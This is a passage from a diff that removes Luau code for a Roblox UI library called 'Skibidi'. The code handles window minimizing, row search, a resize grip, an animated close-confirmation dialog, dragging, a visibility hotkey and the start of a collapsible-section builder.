-				Frame.Size = UDim2.new(0, Width, 0, FULL_H)
-			end
-			return
-		end
-
-		if isMinimized then
-			-- Stage 1: minimize normally (collapse height into the topbar)
-			setBodyVisible(false)
-			local heightTween = TweenService:Create(Frame, TweenMed,
-				{ Size = UDim2.new(0, Width, 0, HEADER_H) })
-			heightTween.Completed:Connect(function(state)
-				if myToken ~= minimizeToken or state ~= Enum.PlaybackState.Completed then return end
-				-- Stage 2: slide sideways to hug the title
-				local mw = computeMinimizedWidth()
-				TweenService:Create(Frame, TweenMed,
-					{ Size = UDim2.new(0, mw, 0, HEADER_H) }):Play()
-			end)
-			heightTween:Play()
-		else
-			-- Stage 1: slide back out to full width
-			local widthTween = TweenService:Create(Frame, TweenMed,
-				{ Size = UDim2.new(0, Width, 0, HEADER_H) })
-			widthTween.Completed:Connect(function(state)
-				if myToken ~= minimizeToken or state ~= Enum.PlaybackState.Completed then return end
-				-- Stage 2: open back up normally
-				setBodyVisible(true)
-				TweenService:Create(Frame, TweenMed,
-					{ Size = UDim2.new(0, Width, 0, FULL_H) }):Play()
-			end)
-			widthTween:Play()
-		end
-	end
-	applyMinimize(true)
-
-	local function SetMinimized(minimized)
-		if isMinimized == minimized then return end
-		isMinimized = minimized
-		-- A search box has nowhere to live in a collapsed header.
-		if minimized then SetSearchOpen(false) end
-		applyMinimize(false)
-	end
-
-	MinBtn.MouseButton1Click:Connect(function()
-		SetMinimized(not isMinimized)
-	end)
-	MinBtn.MouseEnter:Connect(function()
-		TweenService:Create(MinBtn, TweenFast, { BackgroundColor3 = Theme.ToggleOn }):Play()
-	end)
-	MinBtn.MouseLeave:Connect(function()
-		TweenService:Create(MinBtn, TweenFast, { BackgroundColor3 = AccentDim }):Play()
-	end)
-
-	-- ── Search ─────────────────────────────────────────────
-	-- Rows are the direct children of each tab's scrolling frame. A row
-	-- matches when any text inside it (its own label, a section title, a
-	-- toggle's caption…) contains the query, case-insensitively. Rows the
-	-- search hides are remembered so clearing it restores exactly those
-	-- and never un-hides something the caller hid on purpose.
-	local searchOpen   = false
-	local searchHidden = {}   -- row -> true while hidden by the search
-
-	local function rowMatches(row, q)
-		local objs = row:GetDescendants()
-		table.insert(objs, row)
-		for _, d in ipairs(objs) do
-			if (d:IsA("TextLabel") or d:IsA("TextButton")) and d.Text ~= "" then
-				-- RichText labels carry markup; strip it so "<font" can't match.
-				local plain = string.lower((string.gsub(d.Text, "<[^>]->", "")))
-				if string.find(plain, q, 1, true) then return true end
-			end
-		end
-		return false
-	end
-
-	local function applySearch(query)
-		local q = string.lower(query or "")
-		local hits = {}
-		for i, sf in ipairs(tabFrames) do
-			local n = 0
-			for _, row in ipairs(sf:GetChildren()) do
-				if row:IsA("GuiObject") then
-					if q == "" or rowMatches(row, q) then
-						if searchHidden[row] then
-							row.Visible = true
-							searchHidden[row] = nil
-						end
-						if row.Visible then n = n + 1 end
-					elseif row.Visible then
-						row.Visible = false
-						searchHidden[row] = true
-					end
-				end
-			end
-			hits[i] = n
-		end
-		-- Nothing on the current tab but hits elsewhere: jump to the first
-		-- tab that has some, so a search never looks like it found nothing.
-		if q ~= "" and hasTabs and hits[activeTab] == 0 then
-			for i, n in ipairs(hits) do
-				if n > 0 then SetTab(i) break end
-			end
-		end
-	end
-
-	SetSearchOpen = function(open)
-		if not SearchBtn then return end
-		open = open == true
-		if open == searchOpen then return end
-		if open and isMinimized then SetMinimized(false) end
-		searchOpen = open
-
-		-- Only the title and subtitle give way to the box; the header
-		-- icon stays put, like the pip does, so the window keeps its
-		-- identity while you type.
-		TitleLabel.Visible = not open
-		if SubPill then SubPill.Visible = (not open) and plainSubTitle ~= "" end
-		SearchBox.Visible = open
-		SearchBox.Text    = ""
-		TweenService:Create(SearchIcon, TweenFast,
-			{ ImageColor3 = open and Theme.Accent or Theme.AccentSec }):Play()
-		TweenService:Create(SearchBtn, TweenFast,
-			{ BackgroundColor3 = open and Theme.ToggleOn or AccentDim }):Play()
-
-		if open then
-			-- Deferred: focusing in the same frame the box becomes visible
-			-- is dropped by the engine.
-			task.defer(function()
-				if SearchBox.Parent and searchOpen then SearchBox:CaptureFocus() end
-			end)
-		else
-			SearchBox:ReleaseFocus()
-			applySearch("")
-		end
-	end
-
-	if SearchBtn then
-		SearchBtn.MouseButton1Click:Connect(function()
-			SetSearchOpen(not searchOpen)
-		end)
-		SearchBtn.MouseEnter:Connect(function()
-			TweenService:Create(SearchBtn, TweenFast, { BackgroundColor3 = Theme.ToggleOn }):Play()
-		end)
-		SearchBtn.MouseLeave:Connect(function()
-			if searchOpen then return end
-			TweenService:Create(SearchBtn, TweenFast, { BackgroundColor3 = AccentDim }):Play()
-		end)
-		SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
-			if searchOpen then applySearch(SearchBox.Text) end
-		end)
-		-- Escape closes and clears. Enter or clicking away keeps the
-		-- filter in place so the user can interact with what they found.
-		SearchBox.FocusLost:Connect(function(enterPressed, inp)
-			if typeof(inp) == "Instance" and inp:IsA("InputObject")
-			and inp.KeyCode == Enum.KeyCode.Escape then
-				SetSearchOpen(false)
-			end
-		end)
-	end
-
-	-- ── Resize grip (optional, off by default) ─────────────
-	-- Options.Scaler = true adds a small grip in the bottom-right corner.
-	-- Dragging it resizes the panel between MinSize and MaxSize (each axis
-	-- clamped on its own; defaults are half and double the initial size).
-	-- Width / FULL_H are rebound on every change, so minimize/restore and
-	-- the title layout keep working at the new size.
-	local SCALE_ICON_ID = "rbxassetid://122360365318466"   -- lucide "scaling"
-
-	local function sizePair(v)
-		if typeof(v) == "Vector2" then return v.X, v.Y end
-		if typeof(v) == "UDim2"   then return v.X.Offset, v.Y.Offset end
-		if type(v) == "table" then
-			return v[1] or v.X or v.Width or v.w, v[2] or v.Y or v.Height or v.h
-		end
-		return nil, nil
-	end
-	local minSizeW, minSizeH = sizePair(Options.MinSize)
-	local maxSizeW, maxSizeH = sizePair(Options.MaxSize)
-	local MIN_W = Options.MinWidth  or minSizeW or math.floor(Width  / 2)
-	local MIN_H = Options.MinHeight or minSizeH or math.floor(FULL_H / 2)
-	local MAX_W = Options.MaxWidth  or maxSizeW or Width  * 2
-	local MAX_H = Options.MaxHeight or maxSizeH or FULL_H * 2
-	-- The body can never collapse past the header and tab bar.
-	MIN_H = math.max(MIN_H, HEADER_H + TABBAR_H + 24)
-	MIN_W = math.max(MIN_W, 90)
-	MAX_W = math.max(MAX_W, MIN_W)
-	MAX_H = math.max(MAX_H, MIN_H)
-
-	-- Re-derives everything that was sized from Width at build time.
-	local function relayoutForSize()
-		layoutTitle()
-		if hasTabs and not sideTabs and TabBtns then
-			tabW = (Width - 20 - tabGap * (#Tabs - 1)) / #Tabs
-			for _, btn in ipairs(TabBtns) do
-				btn.Size = UDim2.new(0, tabW, 1, 0)
-			end
-			if TabInd then
-				TabInd.Size     = UDim2.new(0, math.floor(tabW), 0, 2)
-				TabInd.Position = tabIndicatorTarget(activeTab)
-			end
-		end
-	end
-
-	local function SetSize(w, h)
-		w = math.floor(tonumber(w) or Width)
-		h = math.floor(tonumber(h) or FULL_H)
-		if showScaler then
-			w = math.clamp(w, MIN_W, MAX_W)
-			h = math.clamp(h, MIN_H, MAX_H)
-		end
-		Width  = w
-		FULL_H = h
-		if not isMinimized then
-			Frame.Size = UDim2.new(0, Width, 0, FULL_H)
-		end
-		relayoutForSize()
-	end
-
-	if showScaler then
-		ScaleBtn = Instance.new("ImageButton")
-		ScaleBtn.Name                   = "SkibidiResizeGrip"
-		ScaleBtn.Size                   = UDim2.new(0, 16, 0, 16)
-		ScaleBtn.AnchorPoint            = Vector2.new(1, 1)
-		ScaleBtn.Position               = UDim2.new(1, -5, 1, -5)
-		ScaleBtn.BackgroundTransparency = 1
-		ScaleBtn.Image                  = SCALE_ICON_ID
-		ScaleBtn.ImageColor3            = Theme.TextMuted
-		ScaleBtn.ImageTransparency      = 0.25
-		ScaleBtn.AutoButtonColor        = false
-		ScaleBtn.ZIndex                 = 8
-		ScaleBtn.Visible                = not isMinimized
-		ScaleBtn.Parent                 = Frame
-
-		local resizing, resizeStart, startW, startH = false, nil, 0, 0
-		local function restGrip()
-			if resizing then return end
-			TweenService:Create(ScaleBtn, TweenFast,
-				{ ImageColor3 = Theme.TextMuted, ImageTransparency = 0.25 }):Play()
-		end
-		ScaleBtn.MouseEnter:Connect(function()
-			TweenService:Create(ScaleBtn, TweenFast,
-				{ ImageColor3 = Accent, ImageTransparency = 0 }):Play()
-		end)
-		ScaleBtn.MouseLeave:Connect(restGrip)
-		ScaleBtn.InputBegan:Connect(function(inp)
-			if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			if isMinimized then return end
-			resizing    = true
-			resizeStart = inp.Position
-			startW, startH = Width, FULL_H
-			TweenService:Create(ScaleBtn, TweenFast,
-				{ ImageColor3 = Accent, ImageTransparency = 0 }):Play()
-		end)
-		ConnectScoped(Gui, UserInputService.InputEnded, function(inp)
-			if not resizing then return end
-			if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			resizing = false
-			restGrip()
-		end)
-		ConnectScoped(Gui, UserInputService.InputChanged, function(inp)
-			if not resizing then return end
-			if inp.UserInputType ~= Enum.UserInputType.MouseMovement
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			local d = inp.Position - resizeStart
-			SetSize(startW + d.X, startH + d.Y)
-		end)
-	end
-
-	-- ── Closing ────────────────────────────────────────────
-	-- Fade helpers: every transparency-bearing descendant remembers its
-	-- resting value so the whole tree can be faded out (t = 1) and back
-	-- in (t = 0) without a per-element special case.
-	local function CollectFade(root, extra)
-		local list = {}
-		local function add(o)
-			if o:IsA("UIStroke") then
-				list[#list+1] = { o, "Transparency", o.Transparency }
-			elseif o:IsA("GuiObject") then
-				list[#list+1] = { o, "BackgroundTransparency", o.BackgroundTransparency }
-				if o:IsA("TextLabel") or o:IsA("TextButton") or o:IsA("TextBox") then
-					list[#list+1] = { o, "TextTransparency", o.TextTransparency }
-				end
-				if o:IsA("ImageLabel") or o:IsA("ImageButton") then
-					list[#list+1] = { o, "ImageTransparency", o.ImageTransparency }
-				end
-				if o:IsA("ScrollingFrame") then
-					list[#list+1] = { o, "ScrollBarImageTransparency", o.ScrollBarImageTransparency }
-				end
-			end
-		end
-		add(root)
-		for _, d in ipairs(root:GetDescendants()) do add(d) end
-		for _, o in ipairs(extra or {}) do add(o) end
-		return list
-	end
-	local function FadeTo(list, t, info)
-		for _, e in ipairs(list) do
-			local obj, prop, rest = e[1], e[2], e[3]
-			local v = rest + (1 - rest) * t
-			if info then
-				TweenService:Create(obj, info, { [prop] = v }):Play()
-			else
-				obj[prop] = v
-			end
-		end
-	end
-
-	local TweenCloseOut = TweenInfo.new(0.26, Enum.EasingStyle.Back,  Enum.EasingDirection.In)
-	local TweenFadeOut  = TweenInfo.new(0.22, Enum.EasingStyle.Quad,  Enum.EasingDirection.In)
-	local TweenDlgOut   = TweenInfo.new(0.16, Enum.EasingStyle.Quad,  Enum.EasingDirection.In)
-
-	local closing = false
-	-- Shrinks the panel back the way it arrived, fades everything (shadow
-	-- and bloom included) and only then destroys the ScreenGui.
-	local function CloseWindow()
-		if closing or not Gui or not Gui.Parent then return end
-		closing = true
-		local extra = {}
-		for _, L in ipairs(shadowLayers) do extra[#extra+1] = L.Obj end
-		if Bloom then extra[#extra+1] = Bloom end
-		local fade = CollectFade(Frame, extra)
-		FadeTo(fade, 1, TweenFadeOut)
-		TweenService:Create(OpenScale, TweenCloseOut, { Scale = 0.86 }):Play()
-		for _, L in ipairs(shadowLayers) do
-			TweenService:Create(L.Scale, TweenCloseOut, { Scale = 0.86 }):Play()
-		end
-		task.delay(0.28, function()
-			if Gui then Gui:Destroy() end
-		end)
-	end
-
-	-- "Are you sure?" dialog. A dimmer covers just the panel (mirroring
-	-- its position, size and corner radius, and eating clicks meant for
-	-- it) while a small card pops in over the middle. Escape / clicking
-	-- the dimmer cancels, Return confirms.
-	local confirmOpen = false
-	local function ConfirmClose()
-		if closing or confirmOpen then return end
-		confirmOpen = true
-
-		-- The dimmer is a sibling of the panel (not a child) so a card
-		-- taller than a minimized panel can still hang past its edges.
-		local Dim = Instance.new("Frame")
-		Dim.Name                   = "SkibidiCloseDim"
-		Dim.Position               = Frame.Position
-		Dim.Size                   = Frame.Size
-		Dim.BackgroundColor3       = Color3.new(0, 0, 0)
-		Dim.BackgroundTransparency = 1
-		Dim.BorderSizePixel        = 0
-		Dim.Active                 = true
-		Dim.ZIndex                 = 100
-		Dim.Parent                 = Gui
-		MakeCorner(Dim, UDim.new(0, Theme.CornerRadius))
-		local dimPosConn = Frame:GetPropertyChangedSignal("Position"):Connect(function()
-			Dim.Position = Frame.Position
-		end)
-		local dimSizeConn = Frame:GetPropertyChangedSignal("Size"):Connect(function()
-			Dim.Size = Frame.Size
-		end)
-
-		-- Holder carries the anchor and the pop scale so the card itself
-		-- (and the glow MakeGlow hangs off it) can stay top-left anchored.
-		local CARD_W, CARD_H = 250, 118
-		local Holder = Instance.new("Frame")
-		Holder.Size                   = UDim2.new(0, CARD_W, 0, CARD_H)
-		Holder.AnchorPoint            = Vector2.new(0.5, 0.5)
-		Holder.Position               = UDim2.new(0.5, 0, 0.5, 0)
-		Holder.BackgroundTransparency = 1
-		Holder.ZIndex                 = 100
-		Holder.Parent                 = Dim
-
-		local CardScale = Instance.new("UIScale")
-		CardScale.Scale  = 0.82
-		CardScale.Parent = Holder
-
-		local Card = Instance.new("Frame")
-		Card.Size                   = UDim2.new(1, 0, 1, 0)
-		Card.BackgroundColor3       = Theme.Bg1
-		Card.BackgroundTransparency = 0.02
-		Card.BorderSizePixel        = 0
-		Card.Active                 = true
-		Card.ZIndex                 = 101
-		Card.Parent                 = Holder
-		MakeCorner(Card, UDim.new(0, Theme.CornerRadius))
-		MakeEdge(Card, Theme.Danger, 1.2, 0.35)
-		MakeGloss(Card, 0.14)
-		MakeGrain(Card)
-		local CardGlow = MakeGlow(Card, Theme.Danger, 14, 0.84)
-		if CardGlow then CardGlow.ZIndex = 100 end
-
-		local Title = Instance.new("TextLabel")
-		Title.Size                   = UDim2.new(1, -28, 0, 18)
-		Title.Position               = UDim2.new(0, 14, 0, 14)
-		Title.BackgroundTransparency = 1
-		Title.Font                   = Theme.FontBold
-		Title.TextSize               = Theme.TitleSize
-		Title.TextColor3             = Theme.TextPrimary
-		Title.TextXAlignment         = Enum.TextXAlignment.Left
-		Title.Text                   = Options.CloseTitle or "Close panel?"
-		Title.ZIndex                 = 102
-		Title.Parent                 = Card
-
-		local Body = Instance.new("TextLabel")
-		Body.Size                   = UDim2.new(1, -28, 0, 30)
-		Body.Position               = UDim2.new(0, 14, 0, 34)
-		Body.BackgroundTransparency = 1
-		Body.Font                   = Theme.FontRegular
-		Body.TextSize               = Theme.SmallSize
-		Body.TextColor3             = Theme.TextMuted
-		Body.TextWrapped            = true
-		Body.TextXAlignment         = Enum.TextXAlignment.Left
-		Body.TextYAlignment         = Enum.TextYAlignment.Top
-		Body.Text                   = Options.CloseMessage
-			or "Are you sure? Everything in this window will be closed."
-		Body.ZIndex                 = 102
-		Body.Parent                 = Card
-
-		local function MakeDialogButton(text, x, w, bg, bgAlpha, fg, edge)
-			local B = Instance.new("TextButton")
-			B.Size                   = UDim2.new(0, w, 0, 28)
-			B.AnchorPoint            = Vector2.new(1, 1)
-			B.Position               = UDim2.new(1, x, 1, -12)
-			B.BackgroundColor3       = bg
-			B.BackgroundTransparency = bgAlpha
-			B.BorderSizePixel        = 0
-			B.Font                   = Theme.FontMedium
-			B.TextSize               = Theme.SmallSize
-			B.TextColor3             = fg
-			B.Text                   = text
-			B.AutoButtonColor        = false
-			B.ZIndex                 = 102
-			B.Parent                 = Card
-			MakeCorner(B, UDim.new(0, Theme.CornerRadiusSmall))
-			MakeEdge(B, edge, 1, 0.5)
-			MakeGloss(B, 0.16)
-			MakeRipple(B, fg, 8)
-			local sc = Instance.new("UIScale")
-			sc.Parent = B
-			B.MouseEnter:Connect(function()
-				TweenService:Create(sc, TweenFast, { Scale = 1.04 }):Play()
-				TweenService:Create(B, TweenFast, { BackgroundTransparency = math.max(bgAlpha - 0.15, 0) }):Play()
-			end)
-			B.MouseLeave:Connect(function()
-				TweenService:Create(sc, TweenFast, { Scale = 1 }):Play()
-				TweenService:Create(B, TweenFast, { BackgroundTransparency = bgAlpha }):Play()
-			end)
-			B.MouseButton1Down:Connect(function()
-				TweenService:Create(sc, TweenSnap, { Scale = 0.94 }):Play()
-			end)
-			B.MouseButton1Up:Connect(function()
-				TweenService:Create(sc, TweenPop, { Scale = 1 }):Play()
-			end)
-			return B
-		end
-
-		local YesBtn = MakeDialogButton("Close",  -14,        76, Theme.Danger, 0.12, Color3.new(1, 1, 1), Theme.Danger)
-		local NoBtn  = MakeDialogButton("Cancel", -14 - 76 - 6, 76, Theme.Bg2, 0, Theme.TextPrimary, Accent)
-
-		-- Pop in: dimmer darkens, card scales up from 0.82 while its
-		-- contents fade in from fully transparent.
-		local fade = CollectFade(Card, CardGlow and { CardGlow } or nil)
-		FadeTo(fade, 1)
-		TweenService:Create(Dim, TweenMed, { BackgroundTransparency = 0.45 }):Play()
-		TweenService:Create(CardScale, TweenPop, { Scale = 1 }):Play()
-		FadeTo(fade, 0, TweenMed)
-
-		local keyConn
-		local function Dismiss(confirmed)
-			if not confirmOpen then return end
-			confirmOpen = false
-			if keyConn then keyConn:Disconnect(); keyConn = nil end
-			dimPosConn:Disconnect()
-			dimSizeConn:Disconnect()
-			TweenService:Create(Dim, TweenDlgOut, { BackgroundTransparency = 1 }):Play()
-			TweenService:Create(CardScale, TweenDlgOut, { Scale = 0.88 }):Play()
-			FadeTo(fade, 1, TweenDlgOut)
-			task.delay(0.18, function() if Dim.Parent then Dim:Destroy() end end)
-			if confirmed then CloseWindow() end
-		end
-
-		YesBtn.MouseButton1Click:Connect(function() Dismiss(true) end)
-		NoBtn.MouseButton1Click:Connect(function() Dismiss(false) end)
-		Dim.InputBegan:Connect(function(inp)
-			if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			local p, s = Card.AbsolutePosition, Card.AbsoluteSize
-			local x, y = inp.Position.X, inp.Position.Y
-			if x < p.X or x > p.X + s.X or y < p.Y or y > p.Y + s.Y then
-				Dismiss(false)
-			end
-		end)
-		keyConn = ConnectScoped(Gui, UserInputService.InputBegan, function(inp, gp)
-			if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
-			if inp.KeyCode == Enum.KeyCode.Escape then
-				Dismiss(false)
-			elseif inp.KeyCode == Enum.KeyCode.Return and not gp then
-				Dismiss(true)
-			end
-		end)
-	end
-
-	-- Options.ConfirmClose = false skips the dialog and closes on click.
-	CloseBtn.MouseButton1Click:Connect(function()
-		if Options.ConfirmClose == false then CloseWindow() else ConfirmClose() end
-	end)
-	CloseBtn.MouseEnter:Connect(function()
-		TweenService:Create(CloseBtn, TweenFast, { BackgroundColor3 = Color3.fromRGB(200, 60, 60) }):Play()
-	end)
-	CloseBtn.MouseLeave:Connect(function()
-		TweenService:Create(CloseBtn, TweenFast, { BackgroundColor3 = AccentDim }):Play()
-	end)
-
-	-- ── Dragging ───────────────────────────────────────────
-	do
-		local clampToScreen = Options.ClampToScreen == true
-		local dragging, dragStart, startPos = false, nil, nil
-		Header.InputBegan:Connect(function(inp)
-			if inp.UserInputType ~= Enum.UserInputType.MouseButton1
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			dragging  = true
-			dragStart = inp.Position
-			startPos  = Frame.Position
-			inp.Changed:Connect(function()
-				if inp.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end)
-		-- Scoped: the service-level connection dies with the panel's Gui
-		-- instead of leaking after Close().
-		ConnectScoped(Gui, UserInputService.InputChanged, function(inp)
-			if not dragging then return end
-			if inp.UserInputType ~= Enum.UserInputType.MouseMovement
-			and inp.UserInputType ~= Enum.UserInputType.Touch then return end
-			local d = inp.Position - dragStart
-			local pos = UDim2.new(
-				startPos.X.Scale, startPos.X.Offset + d.X,
-				startPos.Y.Scale, startPos.Y.Offset + d.Y)
-			if clampToScreen then
-				local screen = Gui.AbsoluteSize
-				local fw, fh = Frame.AbsoluteSize.X, Frame.AbsoluteSize.Y
-				local absX = math.clamp(pos.X.Scale * screen.X + pos.X.Offset, 0, math.max(0, screen.X - fw))
-				local absY = math.clamp(pos.Y.Scale * screen.Y + pos.Y.Offset, 0, math.max(0, screen.Y - fh))
-				pos = UDim2.new(
-					pos.X.Scale, absX - pos.X.Scale * screen.X,
-					pos.Y.Scale, absY - pos.Y.Scale * screen.Y)
-			end
-			Frame.Position = pos
-		end)
-	end
-
-	-- ── Visibility (programmatic + optional hotkey) ────────
-	local function SetVisible(visible)
-		Gui.Enabled = visible == true
-	end
-	local function ToggleVisible()
-		Gui.Enabled = not Gui.Enabled
-	end
-	do
-		local tk = Options.ToggleKey
-		if type(tk) == "string" then
-			local ok, parsed = pcall(function() return Enum.KeyCode[tk] end)
-			tk = ok and parsed or nil
-		end
-		if typeof(tk) == "EnumItem" then
-			ConnectScoped(Gui, UserInputService.InputBegan, function(inp, gameProcessed)
-				if gameProcessed then return end
-				if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == tk then
-					ToggleVisible()
-				end
-			end)
-		end
-	end
-
-	-- Swaps the header icon at runtime. Passing nil brings the pip back.
-	-- TITLE_X is an upvalue of layoutTitle / computeMinimizedWidth, so
-	-- re-assigning it here is enough for those; only the things sized
-	-- from it at build time need touching by hand.
-	local function SetTitleIcon(spec)
-		if spec == nil or spec == "" then
-			if TitleIcon then TitleIcon:Destroy() end
-			TitleIcon        = nil
-			TitlePip.Visible = true
-			TITLE_X          = TITLE_X_PIP
-		else
-			if not TitleIcon then
-				TitleIcon = MakeIcon(Header, spec, TITLE_ICON, Theme.AccentSec, 3)
-				TitleIcon.Name        = "SkibidiTitleIcon"
-				TitleIcon.AnchorPoint = Vector2.new(0, 0.5)
-				TitleIcon.Position    = UDim2.new(0, 11, 0.5, 0)
-			else
-				SetIconImage(TitleIcon, spec)
-			end
-			TitlePip.Visible = false
-			TITLE_X          = TITLE_X_ICON
-		end
-		TitleLabel.Position = UDim2.new(0, TITLE_X, 0, 0)
-		if SearchBox then
-			SearchBox.Position = UDim2.new(0, TITLE_X, 0.5, 0)
-			SearchBox.Size     = UDim2.new(1, -(reservedRight + TITLE_X), 0, 22)
-		end
-		layoutTitle()
-		if isMinimized then
-			Frame.Size = UDim2.new(0, computeMinimizedWidth(), 0, HEADER_H)
-		end
-	end
-
-	-- ── Return ─────────────────────────────────────────────
-	return {
-		Gui          = Gui,
-		Frame        = Frame,
-		Header       = Header,
-		TitleLabel   = TitleLabel,
-		GetTitleIcon = function() return TitleIcon end,
-		SetIcon      = SetTitleIcon,
-		SetTabIcon   = makeTabIcon,
-		GetTabIcon   = function(i) return tabIcons[i] end,
-		-- Content is the first (or only) tab frame for convenience
-		Content      = tabFrames[1],
-		GetTab       = function(i) return tabFrames[i] end,
-		SetTab       = SetTab,
-		GetActiveTab = function() return activeTab end,
-		GetTabButton = function(i) return TabBtns and TabBtns[i] end,
-		SetTitle     = function(t)
-			plainTitle      = t or ""
-			TitleLabel.Text = plainTitle
-			layoutTitle()
-			if isMinimized then
-				Frame.Size = UDim2.new(0, computeMinimizedWidth(), 0, HEADER_H)
-			end
-		end,
-		SetSubTitle  = function(t)
-			if not SubLabel then return end
-			plainSubTitle  = t or ""
-			SubLabel.Text  = plainSubTitle
-			SubPill.Visible = plainSubTitle ~= ""
-			layoutTitle()
-			if isMinimized then
-				Frame.Size = UDim2.new(0, computeMinimizedWidth(), 0, HEADER_H)
-			end
-		end,
-		SetMinimized = SetMinimized,
-		IsMinimized  = function() return isMinimized end,
-		SetVisible   = SetVisible,
-		ToggleVisible = ToggleVisible,
-		IsVisible    = function() return Gui.Enabled end,
-		CloseBtn     = CloseBtn,
-		Close        = CloseWindow,   -- animated, no prompt
-		ConfirmClose = ConfirmClose,  -- opens the "are you sure?" dialog
-		DiscordBtn   = DiscordBtn,
-		SearchBtn    = SearchBtn,
-		SetSearchOpen = SetSearchOpen,
-		IsSearchOpen = function() return searchOpen end,
-		SetSearch    = function(text)
-			if not SearchBox then return end
-			SetSearchOpen(true)
-			SearchBox.Text = tostring(text or "")
-		end,
-		ScaleBtn     = ScaleBtn,
-		SetSize      = SetSize,
-		GetSize      = function() return Width, FULL_H end,
-		Accent       = Accent,
-		AccentDim    = AccentDim,
-	}
-end
-
--- ============================================================
--- CreateSection
--- A collapsible section group with a clickable header.
--- Children added to the returned .Content frame will be
--- shown/hidden when the header is clicked.
---
--- Options:
---   Title     string   Section label
---   Icon      string   Lucide icon before the label (optional)
---   Open      bool     Start open (default false)
---   Tooltip   string   Hover tooltip (optional)
---
--- Returns:
---   { Frame, Content, SetOpen(bool), IsOpen(), SetTitle(text), SetIcon(spec) }
--- ============================================================
-function Skibidi.CreateSection(Parent, Options)
-	Options = Options or {}
-	local title    = Options.Title or ""
-	local startOpen = Options.Open == true  -- default false
-
-	-- Outer wrapper — AutomaticSize so it grows with content
-	local Wrapper = Instance.new("Frame")
-	Wrapper.Size             = UDim2.new(1, 0, 0, 0)
-	Wrapper.AutomaticSize    = Enum.AutomaticSize.Y
-	Wrapper.BackgroundColor3 = Theme.Bg2
-	Wrapper.BorderSizePixel  = 0
-	Wrapper.ClipsDescendants = true
-	Wrapper.Parent           = Parent
-	MakeCorner(Wrapper, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Wrapper, Theme.AccentDim, 1)
-	MakeGloss(Wrapper, 0.09)
-
-	local WrapLayout = Instance.new("UIListLayout", Wrapper)
-	WrapLayout.Padding    = UDim.new(0, 0)
-	WrapLayout.SortOrder  = Enum.SortOrder.LayoutOrder
-	WrapLayout.FillDirection = Enum.FillDirection.Vertical
-	-- Center children so the inset divider (1, -16) gets an even 8px
-	-- margin on both sides instead of hugging the left edge.
-	WrapLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
-	-- Header row (clickable)
-	local HeaderRow = Instance.new("TextButton")
-	HeaderRow.Size                   = UDim2.new(1, 0, 0, 34)
-	HeaderRow.LayoutOrder            = 0
-	HeaderRow.BackgroundTransparency = 1
-	HeaderRow.BorderSizePixel        = 0
-	HeaderRow.Text                   = ""
-	HeaderRow.AutoButtonColor        = false
-	HeaderRow.Parent                 = Wrapper
-	MakeHoverFill(HeaderRow, 3, 5)
-
-	-- Accent bar
-	local AccentBar = Instance.new("Frame", HeaderRow)
-	AccentBar.AnchorPoint      = Vector2.new(0, 0.5)
-	AccentBar.Size             = UDim2.new(0, 3, 0, 12)
-	AccentBar.Position         = UDim2.new(0, 8, 0.5, 0)
-	AccentBar.BackgroundColor3 = Theme.Accent
-	AccentBar.BorderSizePixel  = 0
-	AccentBar.ZIndex           = 2
-	MakeCorner(AccentBar, UDim.new(1, 0))
-	MakeAccentFill(AccentBar, Theme.Accent)
-
-	local TitleLbl = Instance.new("TextLabel", HeaderRow)
-	TitleLbl.Size                   = UDim2.new(1, -50, 1, 0)
-	TitleLbl.Position               = UDim2.new(0, 18, 0, 0)
-	TitleLbl.BackgroundTransparency = 1
-	TitleLbl.Font                   = Theme.FontMedium
-	TitleLbl.TextSize               = Theme.SmallSize + 1
-	TitleLbl.TextColor3             = Theme.Accent
-	TitleLbl.TextXAlignment         = Enum.TextXAlignment.Left
-	TitleLbl.Text                   = title
-
-	local SecIcon = Options.Icon and PrefixIcon(TitleLbl, Options.Icon, 14, Theme.Accent) or nil
-
-	-- Arrow indicator
-	local Arrow = Instance.new("TextLabel", HeaderRow)
-	Arrow.Size                   = UDim2.new(0, 20, 1, 0)
-	Arrow.Position               = UDim2.new(1, -24, 0, 0)
-	Arrow.BackgroundTransparency = 1
-	Arrow.Font                   = Theme.FontIcon
-	Arrow.TextSize               = 14
-	Arrow.TextColor3             = Theme.AccentDim
-	Arrow.TextXAlignment         = Enum.TextXAlignment.Center
-	Arrow.Text                   = "▼"
-
-	-- Divider below header
-	local Divider = Instance.new("Frame", Wrapper)
-	Divider.Size             = UDim2.new(1, -16, 0, 1)
-	Divider.Position         = UDim2.new(0, 8, 0, 34)
-	Divider.BackgroundColor3 = Theme.Accent
-	Divider.BackgroundTransparency = 0.35
-	Divider.BorderSizePixel  = 0
-	Divider.LayoutOrder      = 1
-	do
-		local g = Instance.new("UIGradient", Divider)
-		g.Transparency = NumberSequence.new({
-			NumberSequenceKeypoint.new(0.00, 1),
-			NumberSequenceKeypoint.new(0.15, 0.25),
-			NumberSequenceKeypoint.new(0.85, 0.25),
-			NumberSequenceKeypoint.new(1.00, 1),
-		})
-	end
-
-	-- Content frame
-	local Content = Instance.new("Frame", Wrapper)
-	Content.Size              = UDim2.new(1, 0, 0, 0)
-	Content.AutomaticSize     = Enum.AutomaticSize.Y
-	Content.BackgroundTransparency = 1
-	Content.BorderSizePixel   = 0
-	Content.LayoutOrder       = 2
-	Content.ClipsDescendants  = false
-	MakePadding(Content, 8, 8, 6, 8)
-	MakeListLayout(Content, Enum.FillDirection.Vertical, 6)
-
-	-- Open/close state
-	local isOpen = startOpen
-	local function SetOpen(open)
-		isOpen = open
-		Content.Visible  = open
-		Divider.Visible  = open
-		TweenService:Create(Arrow, TweenMed,
-			{ Rotation   = open and 180 or 0,
-			  TextColor3 = open and Theme.Accent or Theme.AccentDim }):Play()
-		-- The accent bar stretching to full height is the cue that reads
-		-- from across the panel, well before the small chevron does.
-		TweenService:Create(AccentBar, TweenSpring,
